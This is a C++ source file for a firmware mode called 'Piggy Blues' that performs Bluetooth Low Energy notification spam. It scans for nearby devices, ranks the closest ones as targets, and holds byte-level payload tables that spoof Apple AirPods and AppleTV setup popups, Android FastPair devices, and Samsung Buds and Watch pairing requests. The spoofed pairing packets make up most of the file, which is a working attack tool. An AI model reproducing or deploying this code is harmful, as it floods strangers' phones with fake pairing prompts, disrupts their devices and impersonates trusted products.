1|// Piggy Blues Mode implementation - BLE Notification Spam
2|
3|#include "piggyblues.h"
4|#include "../core/config.h"
5|#include "../core/xp.h"
6|#include "../core/wifi_utils.h"
7|#include "../core/network_recon.h"
8|#include "../ui/display.h"
9|#include "../piglet/mood.h"
10|#include "../piglet/avatar.h"
11|#include "../audio/sfx.h"
12|#include "../hal/hal_input.h"
13|#include <NimBLEDevice.h>
14|#include <WiFi.h>
15|#include <algorithm>
16|
17|// Include NimBLE internal header for direct GAP access
18|extern "C" {
19|#include "nimble/nimble/host/include/host/ble_gap.h"
20|}
21|
22|// ============ Timing Constants (defaults, Config::ble() overrides) ============
23|static const uint16_t DEFAULT_BURST_INTERVAL_MS = 200;  // Time between advertisement bursts
24|static const uint16_t DEFAULT_ADV_DURATION_MS = 100;    // How long each advertisement runs
25|static const uint16_t BLE_STACK_SETTLE_MS = 50;         // Delay for BLE stack to settle (reduced for async)
26|static const uint16_t BLE_OP_DELAY_MS = 20;             // Short delay between BLE operations (reduced)
27|static const uint16_t BLE_ADV_MIN_INTERVAL = 32;        // 20ms (32 * 0.625ms)
28|static const uint16_t BLE_ADV_MAX_INTERVAL = 64;        // 40ms (64 * 0.625ms)
29|static const uint8_t  MAX_TARGETS = 50;                 // Maximum targets to track
30|static const uint8_t  MAX_ACTIVE_TARGETS = 4;           // Maximum active targets for payload selection
31|static const uint8_t  MAX_TARGETS_FOR_MOOD = 255;       // Cap for uint8_t mood parameter
32|static const uint32_t TARGET_STALE_TIMEOUT_MS = 10000;  // 10 seconds before target considered stale
33|static const uint8_t  REBOOT_CHANCE_PERCENT = 50;       // 0-100 chance to reboot on exit
34|static const uint16_t NO_REBOOT_XP_BONUS = 15;          // Bonus XP when no reboot happens
35|
36|// UI Constants
37|static const uint16_t DIALOG_WIDTH = 200;               // Warning dialog width
38|static const uint16_t DIALOG_HEIGHT = 70;               // Warning dialog height
39|static const uint32_t DIALOG_TIMEOUT_MS = 5000;         // Warning dialog timeout
40|static const uint32_t MOOD_UPDATE_INTERVAL_MS = 3000;   // Mood phrase update interval
41|
42|// Warm-up payload (31 bytes) to pre-allocate advertisement buffer
43|static const uint8_t ADV_WARMUP_PAYLOAD[] = {
44|    0x1d, 0x09, 'P','I','G','G','Y','-','B','L','U','E','S','-','W','A','R','M','U','P','-','B','U','F','F','E','R','-','0'
45|};
46|
47|// Runtime config values (loaded from Config::ble())
48|static uint16_t cfgBurstInterval = DEFAULT_BURST_INTERVAL_MS;
49|static uint16_t cfgAdvDuration = DEFAULT_ADV_DURATION_MS;
50|
51|// Static members
52|bool PiggyBluesMode::running = false;
53|bool PiggyBluesMode::confirmed = false;
54|uint32_t PiggyBluesMode::lastBurstTime = 0;
55|uint16_t PiggyBluesMode::burstInterval = 100;
56|bool PiggyBluesMode::scanRunning = false;
57|bool PiggyBluesMode::advertisingNow = false;
58|std::vector<BLETarget> PiggyBluesMode::targets;
59|uint8_t PiggyBluesMode::activeCount = 0;
60|uint32_t PiggyBluesMode::totalPackets = 0;
61|uint32_t PiggyBluesMode::appleCount = 0;
62|uint32_t PiggyBluesMode::androidCount = 0;
63|uint32_t PiggyBluesMode::samsungCount = 0;
64|uint32_t PiggyBluesMode::windowsCount = 0;
65|
66|// BLE state synchronization
67|static portMUX_TYPE bleStateMux = portMUX_INITIALIZER_UNLOCKED;
68|
69|bool PiggyBluesMode::getAdvertisingNow() {
70|    bool value;
71|    taskENTER_CRITICAL(&bleStateMux);
72|    value = advertisingNow;
73|    taskEXIT_CRITICAL(&bleStateMux);
74|    return value;
75|}
76|
77|void PiggyBluesMode::setAdvertisingNow(bool value) {
78|    taskENTER_CRITICAL(&bleStateMux);
79|    advertisingNow = value;
80|    taskEXIT_CRITICAL(&bleStateMux);
81|}
82|
83|bool PiggyBluesMode::getScanRunning() {
84|    bool value;
85|    taskENTER_CRITICAL(&bleStateMux);
86|    value = scanRunning;
87|    taskEXIT_CRITICAL(&bleStateMux);
88|    return value;
89|}
90|
91|void PiggyBluesMode::setScanRunning(bool value) {
92|    taskENTER_CRITICAL(&bleStateMux);
93|    scanRunning = value;
94|    taskEXIT_CRITICAL(&bleStateMux);
95|}
96|
97|// Reusable advertisement data to avoid heap churn in hot paths
98|static NimBLEAdvertisementData advDataCache;
99|static bool advCachePrimed = false;
100|static inline void primeAdvCache() {
101|    if (advCachePrimed) return;
102|    advDataCache.clearData();
103|    // Add max-size payload to force NimBLE's internal buffer allocation.
104|    // Keep the data — first real sendX() call will clearData() before setting payload.
105|    advDataCache.addData(ADV_WARMUP_PAYLOAD, sizeof(ADV_WARMUP_PAYLOAD));
106|    advCachePrimed = true;
107|}
108|
109|// ============ Deferred Target System ============
110|// Scan callback sets pending target, update() processes in main thread
111|// Single-slot pattern (like OINK) - missing a few is acceptable
112|static portMUX_TYPE pendingTargetMux = portMUX_INITIALIZER_UNLOCKED;
113|static volatile bool pendingTargetAdd = false;
114|static volatile bool pendingTargetBusy = false;
115|static BLETarget pendingTarget;
116|
117|// Scan callbacks instance
118|static PiggyBluesScanCallbacks scanCallbacks;
119|
120|// ============ Scan Callback Implementation ============
121|// Called from NimBLE task context - must be quick, no heavy processing
122|
123|static BLEVendor identifyVendorFromPayload(const std::vector<uint8_t>& payload) {
124|    size_t idx = 0;
125|    // Add bounds checking to prevent out-of-bounds access
126|    while (idx + 1 < payload.size()) {
127|        uint8_t len = payload[idx];
128|        if (len == 0) {
129|            break;
130|        }
131|        // Ensure we don't go out of bounds when accessing payload[idx + len + 1]
132|        if (idx + len >= payload.size()) {
133|            break; // Prevent out-of-bounds access
134|        }
135|        size_t next = idx + len + 1;
136|        if (next > payload.size()) {
137|            break;
138|        }
139|        if (payload[idx + 1] == 0xFF) {  // Manufacturer data
140|            // Make sure we have at least 2 bytes for company ID
141|            if (len < 1) {
142|                idx = next;
143|                continue;
144|            }
145|            const uint8_t* data = payload.data() + idx + 2;
146|            size_t dataLen = len - 1;
147|            // Make sure we have at least 2 bytes for company ID
148|            if (dataLen < 2) {
149|                idx = next;
150|                continue;
151|            }
152|            return PiggyBluesMode::identifyVendor(data, dataLen);
153|        }
154|        idx = next;
155|    }
156|    return BLEVendor::UNKNOWN;
157|}
158|
159|void PiggyBluesScanCallbacks::onResult(const NimBLEAdvertisedDevice* device) {
160|    // Called for each device found during continuous scan
161|    // Use deferred pattern: quick copy, process in main thread
162|    
163|    if (!device) return;
164|    if (PiggyBluesMode::getAdvertisingNow()) return;  // Skip during advertising (RF interference)
165|    
166|    // Extract info quickly
167|    BLETarget target;
168|    memcpy(target.addr, device->getAddress().getBase()->val, 6);
169|    target.rssi = device->getRSSI();
170|    target.lastSeen = millis();
171|    
172|    // Identify vendor from payload without heap allocations
173|    target.vendor = identifyVendorFromPayload(device->getPayload());
174|    
175|    // Queue for processing
176|    taskENTER_CRITICAL(&pendingTargetMux);
177|    if (!pendingTargetBusy && !pendingTargetAdd) {
178|        pendingTarget = target;
179|        pendingTargetAdd = true;
180|    }
181|    taskEXIT_CRITICAL(&pendingTargetMux);
182|}
183|
184|void PiggyBluesScanCallbacks::onScanEnd(const NimBLEScanResults& results, int reason) {
185|    // Continuous scan shouldn't end unless stopped or error
186|    // NimBLE 2.x: stop() does NOT call onScanEnd, so this only fires on unexpected termination
187|    // If we're still running and not advertising, restart scan
188|    if (PiggyBluesMode::isRunning() && !PiggyBluesMode::getAdvertisingNow()) {
189|        // Mark scan as stopped so startContinuousScan() will restart it
190|        PiggyBluesMode::setScanRunning(false);
191|        PiggyBluesMode::startContinuousScan();
192|    }
193|}
194|
195|// ============ New Continuous Scan Functions ============
196|
197|void PiggyBluesMode::startContinuousScan() {
198|    if (getScanRunning()) return;
199|    
200|    NimBLEScan* pScan = NimBLEDevice::getScan();
201|    if (!pScan) {
202|        return;
203|    }
204|    
205|    pScan->setScanCallbacks(&scanCallbacks, false);  // false = don't delete old callbacks
206|    pScan->setActiveScan(true);
207|    pScan->setInterval(100);
208|    pScan->setWindow(99);
209|    pScan->setDuplicateFilter(false);  // See all advertisements for RSSI updates
210|    
211|    // Start continuous non-blocking scan
212|    // NimBLE 2.x: start(duration, callback, continuous) 
213|    // duration=0 means forever, continuous=true for real-time callbacks
214|    if (pScan->start(0, false, true)) {
215|        setScanRunning(true);
216|    }
217|}
218|
219|void PiggyBluesMode::stopContinuousScan() {
220|    if (!getScanRunning()) return;
221|    
222|    NimBLEScan* pScan = NimBLEDevice::getScan();
223|    if (pScan && pScan->isScanning()) {
224|        pScan->stop();
225|        delay(BLE_OP_DELAY_MS);
226|    }
227|    setScanRunning(false);
228|}
229|
230|void PiggyBluesMode::processTargets() {
231|    // Process any pending target from scan callback (deferred pattern)
232|    BLETarget newTarget;
233|    bool hasTarget = false;
234|    
235|    taskENTER_CRITICAL(&pendingTargetMux);
236|    if (pendingTargetAdd) {
237|        pendingTargetBusy = true;
238|        newTarget = pendingTarget;
239|        pendingTargetAdd = false;
240|        pendingTargetBusy = false;
241|        hasTarget = true;
242|    }
243|    taskEXIT_CRITICAL(&pendingTargetMux);
244|    
245|    if (!hasTarget) return;
246|    
247|    // Upsert into targets list
248|    upsertTarget(newTarget);
249|}
250|
251|void PiggyBluesMode::upsertTarget(const BLETarget& target) {
252|    // Find existing or add new
253|    for (auto& t : targets) {
254|        if (memcmp(t.addr, target.addr, 6) == 0) {
255|            // Update existing - refresh RSSI and timestamp
256|            t.rssi = target.rssi;
257|            t.lastSeen = target.lastSeen;
258|            t.vendor = target.vendor;  // May have been UNKNOWN before
259|            return;
260|        }
261|    }
262|    
263|    // New target - add if room
264|    if (targets.size() < MAX_TARGETS) {
265|        targets.push_back(target);
266|    }
267|}
268|
269|void PiggyBluesMode::ageOutStaleTargets() {
270|    uint32_t now = millis();
271|    size_t writeIdx = 0;
272|    
273|    // Compact the targets array without using erase() to avoid heap churn
274|    for (size_t readIdx = 0; readIdx < targets.size(); ++readIdx) {
275|        if (now - targets[readIdx].lastSeen <= TARGET_STALE_TIMEOUT_MS) {
276|            // Keep this target - move to write position if needed
277|            if (writeIdx != readIdx) {
278|                targets[writeIdx] = targets[readIdx];
279|            }
280|            ++writeIdx;
281|        }
282|    }
283|    
284|    // Truncate the vector to new size - this may still allocate but less frequently
285|    targets.resize(writeIdx);
286|}
287|
288|void PiggyBluesMode::selectActiveTargets() {
289|    if (targets.empty()) {
290|        activeCount = 0;
291|        return;
292|    }
293|    
294|    // Partial sort — only need top 4 by RSSI (strongest first = closest)
295|    activeCount = min((size_t)4, targets.size());
296|    std::partial_sort(targets.begin(), targets.begin() + activeCount, targets.end(),
297|        [](const BLETarget& a, const BLETarget& b) {
298|            return a.rssi > b.rssi;
299|        });
300|}
301|
302|// AppleJuice payloads - fake AirPods/AppleTV/etc popups
303|// Format: length, type (0xFF = manufacturer), Apple company ID (0x004C), device type, ...
304|
305|// Long devices (audio) - 31 bytes each
306|static const uint8_t APPLE_AIRPODS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
307|static const uint8_t APPLE_POWERBEATS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
308|static const uint8_t APPLE_BEATS_SOLO3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x05, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
309|static const uint8_t APPLE_BEATS_STUDIO3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x06, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
310|static const uint8_t APPLE_AIRPODS_MAX[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x09, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
311|static const uint8_t APPLE_POWERBEATS_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
312|static const uint8_t APPLE_BEATS_SOLO_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
313|static const uint8_t APPLE_AIRPODS_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
314|static const uint8_t APPLE_AIRPODS_GEN2[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
315|static const uint8_t APPLE_BEATS_FLEX[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
316|static const uint8_t APPLE_BEATS_STUDIO_BUDS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
317|static const uint8_t APPLE_BEATS_FIT_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
318|static const uint8_t APPLE_AIRPODS_GEN3[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
319|static const uint8_t APPLE_AIRPODS_PRO_GEN2[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
320|static const uint8_t APPLE_BEATS_STUDIO_BUDS_PLUS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
321|static const uint8_t APPLE_BEATS_STUDIO_PRO[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
322|static const uint8_t APPLE_AIRPODS_PRO_GEN2_USBC[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
323|static const uint8_t APPLE_BEATS_SOLO4[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x24, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
324|static const uint8_t APPLE_BEATS_SOLO_BUDS[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x25, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
325|static const uint8_t APPLE_POWERBEATS_FIT[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x2e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
326|static const uint8_t APPLE_AIRPODS_GEN4[] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x2f, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
327|
328|// Short devices (AppleTV, setup, etc) - 23 bytes each - work at longer range
329|static const uint8_t APPLE_TV_PAIR[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
330|static const uint8_t APPLE_TV_NEW_USER[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
331|static const uint8_t APPLE_TV_APPLEID_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
332|static const uint8_t APPLE_TV_WIRELESS_AUDIO[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x2b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
333|static const uint8_t APPLE_TV_HOMEKIT_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0d, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
334|static const uint8_t APPLE_TV_KEYBOARD[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
335|static const uint8_t APPLE_SETUP_NEW_PHONE[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
336|static const uint8_t APPLE_TV_CONNECT_NETWORK[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
337|static const uint8_t APPLE_HOMEPOD_SETUP[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x27, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
338|static const uint8_t APPLE_TV_COLOR_BALANCE[] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x14, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00};
339|
340|// Long audio devices array
341|static const uint8_t* APPLE_DEVICES_LONG[] = {
342|    APPLE_AIRPODS, APPLE_POWERBEATS, APPLE_BEATS_SOLO3, APPLE_BEATS_STUDIO3,
343|    APPLE_AIRPODS_MAX, APPLE_POWERBEATS_PRO, APPLE_BEATS_SOLO_PRO, APPLE_AIRPODS_PRO,
344|    APPLE_AIRPODS_GEN2, APPLE_BEATS_FLEX, APPLE_BEATS_STUDIO_BUDS, APPLE_BEATS_FIT_PRO,
345|    APPLE_AIRPODS_GEN3, APPLE_AIRPODS_PRO_GEN2, APPLE_BEATS_STUDIO_BUDS_PLUS, APPLE_BEATS_STUDIO_PRO,
346|    APPLE_AIRPODS_PRO_GEN2_USBC, APPLE_BEATS_SOLO4, APPLE_BEATS_SOLO_BUDS, APPLE_POWERBEATS_FIT,
347|    APPLE_AIRPODS_GEN4
348|};
349|static const size_t APPLE_LONG_COUNT = sizeof(APPLE_DEVICES_LONG) / sizeof(APPLE_DEVICES_LONG[0]);
350|
351|// Short AppleTV/setup devices array
352|static const uint8_t* APPLE_DEVICES_SHORT[] = {
353|    APPLE_TV_PAIR, APPLE_TV_NEW_USER, APPLE_TV_APPLEID_SETUP, APPLE_TV_WIRELESS_AUDIO,
354|    APPLE_TV_HOMEKIT_SETUP, APPLE_TV_KEYBOARD, APPLE_SETUP_NEW_PHONE, APPLE_TV_CONNECT_NETWORK,
355|    APPLE_HOMEPOD_SETUP, APPLE_TV_COLOR_BALANCE
356|};
357|static const size_t APPLE_SHORT_COUNT = sizeof(APPLE_DEVICES_SHORT) / sizeof(APPLE_DEVICES_SHORT[0]);
358|
359|// Android FastPair model IDs - comprehensive list from various devices
360|static const uint32_t FASTPAIR_MODELS[] = {
361|    // Google devices
362|    0x000006,  // Google Pixel Buds
363|    0x000007,  // Android Auto
364|    0x000008,  // Foocorp Foophones
365|    0x00000A,  // Test - Anti-Spoofing
366|    0x00000B,  // Google Gphones
367|    0x00000C,  // Set Up Device (Google Gphones)
368|    0x000047,  // Arduino 101
369|    0x000048,  // Fast Pair Headphones
370|    0x000049,  // Fast Pair Headphones
371|    0x0582FD,  // Pixel Buds
372|    0x92BBBD,  // Pixel Buds
373|    
374|    // Sony devices
375|    0x00C95C,  // Sony WF-1000X
376|    0x01C95C,  // Sony WF-1000X
377|    0x02C95C,  // Sony WH-1000XM2
378|    0x01EEB4,  // Sony WH-1000XM4
379|    0x058D08,  // Sony WH-1000XM4
380|    0x2D7A23,  // Sony WF-1000XM4
381|    0xD446A7,  // Sony XM5
382|    0x07A41C,  // Sony WF-C700N
383|    
384|    // JBL devices
385|    0xF00200,  // JBL Everest 110GA
386|    0xF00207,  // JBL Everest 710GA
387|    0xF00209,  // JBL LIVE400BT
388|    0xF0020E,  // JBL LIVE500BT
389|    0xF00213,  // JBL LIVE650BTNC
390|    0x02D886,  // JBL REFLECT MINI NC
391|    0x02DD4F,  // JBL TUNE770NC
392|    0x02F637,  // JBL LIVE FLEX
393|    0x038CC7,  // JBL TUNE760NC
394|    0x04ACFC,  // JBL WAVE BEAM
395|    0x04AFB8,  // JBL TUNE 720BT
396|    0x054B2D,  // JBL TUNE125TWS
397|    0x05C452,  // JBL LIVE220BT
398|    0x0660D7,  // JBL LIVE770NC
399|    0x821F66,  // JBL Flip 6
400|    0xF52494,  // JBL Buds Pro
401|    0x718FA4,  // JBL Live 300TWS
402|    
403|    // Bose devices
404|    0x0000F0,  // Bose QuietComfort 35 II
405|    0x0100F0,  // Bose QuietComfort 35 II
406|    0xF00000,  // Bose QuietComfort 35 II
407|    0xCD8256,  // Bose NC 700
408|    
409|    // Samsung Galaxy devices
410|    0x0577B1,  // Galaxy S23 Ultra
411|    0x05A9BC,  // Galaxy S20+
412|    0x06AE20,  // Galaxy S21 5G
413|    
414|    // Others
415|    0x00AA91,  // Beoplay E8 2.0
416|    0x01AA91,  // Beoplay H9 3rd Generation
417|    0x02AA91,  // B&O Earset
418|    0x03AA91,  // B&O Beoplay H8i
419|    0x04AA91,  // Beoplay H4
420|    0x038F16,  // Beats Studio Buds
421|    0x72FB00,  // Soundcore Spirit Pro GVA
422|    0x00A168,  // boAt Airdopes 621
423|    0x00AA48,  // Jabra Elite 2
424|    0x0E30C3,  // Razer Hammerhead TWS
425|    0x72EF8D,  // Razer Hammerhead TWS X
426|    0x057802,  // TicWatch Pro 5
427|    0x05A963,  // WONDERBOOM 3
428|    0xB37A62,  // Tesla
429|    
430|    // LG devices
431|    0xF00300,  // LG HBS-835S
432|    0xF00304,  // LG HBS-1010
433|    0xF00305,  // LG HBS-1500
434|    0xF00309   // LG HBS-2000
435|};
436|static const size_t FASTPAIR_MODEL_COUNT = sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]);
437|
438|// Samsung BLE spam payloads (Galaxy Buds, Watch, etc)
439|// Format: length, 0xFF (manufacturer data), Samsung company ID 0x0075, device data
440|static const uint8_t SAMSUNG_BUDS_PRO[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
441|static const uint8_t SAMSUNG_BUDS_LIVE[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x01, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
442|static const uint8_t SAMSUNG_BUDS_FE[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x06, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
443|static const uint8_t SAMSUNG_BUDS2[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x04, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
444|static const uint8_t SAMSUNG_BUDS2_PRO[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x0e, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
445|static const uint8_t SAMSUNG_BUDS_PLUS[] = {0x1a, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x02, 0xef, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
446|// Samsung Watch pairing (causes watch pair popup spam)
447|static const uint8_t SAMSUNG_WATCH4[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
448|static const uint8_t SAMSUNG_WATCH5[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x02, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
449|static const uint8_t SAMSUNG_WATCH5_PRO[] = {0x15, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x03, 0xff, 0x00, 0x00, 0x43, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
